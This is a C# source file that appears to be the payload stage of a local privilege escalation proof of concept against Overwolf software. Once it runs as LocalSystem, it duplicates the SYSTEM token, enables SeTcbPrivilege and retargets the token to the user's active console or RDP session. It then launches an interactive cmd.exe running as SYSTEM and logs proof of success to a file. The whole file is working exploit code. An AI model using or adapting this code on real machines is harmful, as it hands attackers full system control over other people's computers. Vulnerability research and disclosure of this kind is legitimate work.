using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;

class OverwolfLPEPayload
{
    // Step log and last-known proof body. FlushProof() rewrites the proof
    // file at every checkpoint, so the file on disk always reflects the
    // latest known state — even if the process dies hard instead of throwing.
    static string steps = "";
    static string proofBody = "";
    static readonly string proofPath = @"C:\ProgramData\Overwolf\poc_proof.txt";

    static void FlushProof()
    {
        try
        {
            File.WriteAllText(proofPath, proofBody + "\r\nSteps:\r\n" + steps);
        }
        catch { }
    }

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern uint WTSGetActiveConsoleSessionId();

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool OpenProcessToken(
        IntPtr ProcessHandle,
        uint DesiredAccess,
        out IntPtr TokenHandle);

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool DuplicateTokenEx(
        IntPtr hExistingToken,
        uint dwDesiredAccess,
        IntPtr lpTokenAttributes,
        int ImpersonationLevel,
        int TokenType,
        out IntPtr phNewToken);

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool AdjustTokenPrivileges(
        IntPtr TokenHandle,
        bool DisableAllPrivileges,
        ref TOKEN_PRIVILEGES NewState,
        int BufferLength,
        IntPtr PreviousState,
        IntPtr ReturnLength);

    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    static extern bool LookupPrivilegeValue(
        string lpSystemName,
        string lpName,
        out LUID lpLuid);

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool SetTokenInformation(
        IntPtr TokenHandle,
        int TokenInformationClass,
        ref uint TokenInformation,
        uint TokenInformationLength);

    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    static extern bool CreateProcessAsUser(
        IntPtr hToken,
        string lpApplicationName,
        string lpCommandLine,
        IntPtr lpProcessAttributes,
        IntPtr lpThreadAttributes,
        bool bInheritHandles,
        uint dwCreationFlags,
        IntPtr lpEnvironment,
        string lpCurrentDirectory,
        ref STARTUPINFO lpStartupInfo,
        out PROCESS_INFORMATION lpProcessInformation);

    [DllImport("wtsapi32.dll", SetLastError = true)]
    static extern int WTSEnumerateSessions(
        IntPtr hServer,
        int Reserved,
        int Version,
        ref IntPtr ppSessionInfo,
        ref int pCount);

    [DllImport("wtsapi32.dll")]
    static extern void WTSFreeMemory(IntPtr pMemory);

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    struct WTS_SESSION_INFO
    {
        public int SessionId;
        [MarshalAs(UnmanagedType.LPWStr)] public string pWinStationName;
        public int State;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct LUID
    {
        public uint LowPart;
        public int HighPart;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct TOKEN_PRIVILEGES
    {
        public uint PrivilegeCount;
        public LUID Luid;
        public uint Attributes;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public uint dwProcessId;
        public int dwThreadId;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    struct STARTUPINFO
    {
        public int cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public int dwX;
        public int dwY;
        public int dwXSize;
        public int dwYSize;
        public int dwXCountChars;
        public int dwYCountChars;
        public int dwFillAttribute;
        public int dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool CloseHandle(IntPtr hObject);

    const uint TOKEN_QUERY             = 0x00000008;
    const uint TOKEN_DUPLICATE         = 0x00000002;
    const uint TOKEN_ASSIGN_PRIMARY    = 0x00000001;
    const uint TOKEN_ADJUST_DEFAULT    = 0x00000080;
    const uint TOKEN_ADJUST_SESSIONID  = 0x00000100;
    const uint TOKEN_ADJUST_PRIVILEGES = 0x00000020;
    const uint TOKEN_RIGHTS =
        TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY |
        TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID | TOKEN_ADJUST_PRIVILEGES;

    const uint CREATE_NEW_CONSOLE = 0x00000010;
    const int  SE_PRIVILEGE_ENABLED = 0x00000002;
    const int  ERROR_NOT_ALL_ASSIGNED = 1300;
    const int  WTSActive = 4;
    const int  TokenSessionId = 12; // TOKEN_INFORMATION_CLASS (9 = TokenImpersonationLevel!)

    static void Main(string[] args)
    {
        try
        {
            string whoami = RunCmd("whoami");
            string privs = RunCmd("whoami /priv");
            proofBody = "[Overwolf LPE PoC]\r\n" +
                        "Timestamp: " + DateTime.Now.ToString() + "\r\n" +
                        "Running as: " + whoami + "\r\n" +
                        "Process ID: " + Process.GetCurrentProcess().Id.ToString() + "\r\n" +
                        "Arguments: " + string.Join(" ", args) + "\r\n" +
                        "Integrity: " + GetIntegrity() + "\r\n" +
                        "\r\nPrivileges:\r\n" + privs;
            // Early write so the caller's proof-file wait loop sees execution
            // quickly; subsequent steps keep rewriting the same file.
            FlushProof();

            SpawnSystemTerminal();

            // Final state — success steps included.
            FlushProof();
        }
        catch (Exception ex)
        {
            try
            {
                File.WriteAllText(proofPath,
                    "Error: " + ex.ToString() + "\r\n\r\nSteps:\r\n" + steps);
            }
            catch { }
        }
    }

    // Duplicates the LocalSystem token, enables SeTcbPrivilege (present but
    // DISABLED in service tokens — required for session retargeting), moves
    // the token into the interactive session (session 0 services have no
    // desktop otherwise), and launches cmd.exe on WinSta0\Default. Result:
    // a visible interactive terminal running as SYSTEM.
    static void SpawnSystemTerminal()
    {
        IntPtr hToken;
        if (!OpenProcessToken(Process.GetCurrentProcess().Handle, TOKEN_RIGHTS, out hToken))
            throw new Win32Exception(Marshal.GetLastWin32Error(), "OpenProcessToken failed");

        IntPtr hDupToken;
        if (!DuplicateTokenEx(hToken, TOKEN_RIGHTS, IntPtr.Zero,
            0 /* SecurityAnonymous */, 1 /* TokenPrimary */, out hDupToken))
            throw new Win32Exception(Marshal.GetLastWin32Error(), "DuplicateTokenEx failed");

        CloseHandle(hToken);
        steps += "  [+] SYSTEM token duplicated as primary\r\n";
        FlushProof();

        EnablePrivilege(hDupToken, "SeTcbPrivilege");

        // Candidate sessions: physical console first, then every active WTS
        // session (covers RDP). Session 0 as a last resort.
        List<uint> candidates = new List<uint>();
        uint consoleId = WTSGetActiveConsoleSessionId();
        if (consoleId != 0xFFFFFFFF) candidates.Add(consoleId);
        foreach (uint s in GetActiveSessionIds())
            if (!candidates.Contains(s)) candidates.Add(s);
        if (candidates.Count == 0) candidates.Add(0);

        string lastError = "no candidate sessions";
        foreach (uint target in candidates)
        {
            uint session = target;
            if (!SetTokenInformation(hDupToken, TokenSessionId, ref session, sizeof(uint)))
            {
                lastError = "SetTokenInformation(session " + target + "): " +
                    new Win32Exception(Marshal.GetLastWin32Error()).Message;
                steps += "  [!] " + lastError + "\r\n";
                FlushProof();
                continue;
            }
            steps += "  [+] Token retargeted to session " + target + "\r\n";
            FlushProof();

            STARTUPINFO si = new STARTUPINFO();
            si.cb = Marshal.SizeOf(si);
            si.lpDesktop = "winsta0\\default";

            PROCESS_INFORMATION pi;
            if (CreateProcessAsUser(hDupToken, null, "cmd.exe /k", IntPtr.Zero, IntPtr.Zero,
                false, CREATE_NEW_CONSOLE, IntPtr.Zero, null, ref si, out pi))
            {
                steps += "  [+] cmd.exe spawned as SYSTEM, PID " + pi.dwProcessId +
                         ", session " + target + "\r\n";
                CloseHandle(hDupToken);
                FlushProof();
                return;
            }
            lastError = "CreateProcessAsUser(session " + target + "): " +
                new Win32Exception(Marshal.GetLastWin32Error()).Message;
            steps += "  [!] " + lastError + "\r\n";
            FlushProof();
        }

        CloseHandle(hDupToken);
        throw new Exception("Terminal spawn failed: " + lastError);
    }

    // SeTcbPrivilege is present but disabled in LocalSystem tokens; adjusting
    // a token's session ID requires it enabled.
    static void EnablePrivilege(IntPtr hToken, string privilegeName)
    {
        LUID luid;
        if (!LookupPrivilegeValue(null, privilegeName, out luid))
            throw new Win32Exception(Marshal.GetLastWin32Error(),
                "LookupPrivilegeValue(" + privilegeName + ") failed");

        TOKEN_PRIVILEGES tp;
        tp.PrivilegeCount = 1;
        tp.Luid = luid;
        tp.Attributes = SE_PRIVILEGE_ENABLED;

        if (!AdjustTokenPrivileges(hToken, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero))
        {
            throw new Win32Exception(Marshal.GetLastWin32Error(),
                "AdjustTokenPrivileges(" + privilegeName + ") failed");
        }

        int err = Marshal.GetLastWin32Error();
        if (err == ERROR_NOT_ALL_ASSIGNED)
            steps += "  [!] " + privilegeName + " not assigned to token\r\n";
        else
            steps += "  [+] " + privilegeName + " enabled\r\n";
        FlushProof();
    }

    // Sessions currently in the WTS "Active" state (connected, interactive).
    // Includes RDP sessions, unlike WTSGetActiveConsoleSessionId.
    static List<uint> GetActiveSessionIds()
    {
        List<uint> ids = new List<uint>();
        IntPtr pBuffer = IntPtr.Zero;
        int count = 0;
        try
        {
            if (WTSEnumerateSessions(IntPtr.Zero, 0, 1, ref pBuffer, ref count) != 0)
            {
                int size = Marshal.SizeOf(typeof(WTS_SESSION_INFO));
                IntPtr current = pBuffer;
                for (int i = 0; i < count; i++)
                {
                    WTS_SESSION_INFO info =
                        (WTS_SESSION_INFO)Marshal.PtrToStructure(current, typeof(WTS_SESSION_INFO));
                    if (info.State == WTSActive) ids.Add((uint)info.SessionId);
                    current = (IntPtr)((long)current + size);
                }
            }
        }
        finally
        {
            if (pBuffer != IntPtr.Zero) WTSFreeMemory(pBuffer);
        }
        steps += "  [+] Active WTS sessions: " +
            (ids.Count > 0 ? string.Join(", ", ids) : "none") + "\r\n";
        FlushProof();
        return ids;
    }

    static string RunCmd(string cmd)
    {
        ProcessStartInfo psi = new ProcessStartInfo("cmd.exe", "/c " + cmd);
        psi.RedirectStandardOutput = true;
        psi.UseShellExecute = false;
        psi.CreateNoWindow = true;
        using (Process p = Process.Start(psi))
        {
            string output = p.StandardOutput.ReadToEnd().Trim();
            p.WaitForExit();
            return output;
        }
    }

    static string GetIntegrity()
    {
        try
        {
            string output = RunCmd("whoami /groups");
            if (output.Contains("S-1-16-16384")) return "System";
            if (output.Contains("S-1-16-12288")) return "High";
            if (output.Contains("S-1-16-8192")) return "Medium";
            if (output.Contains("S-1-16-4096")) return "Low";
            return "Unknown";
        }
        catch { return "Error"; }
    }
}
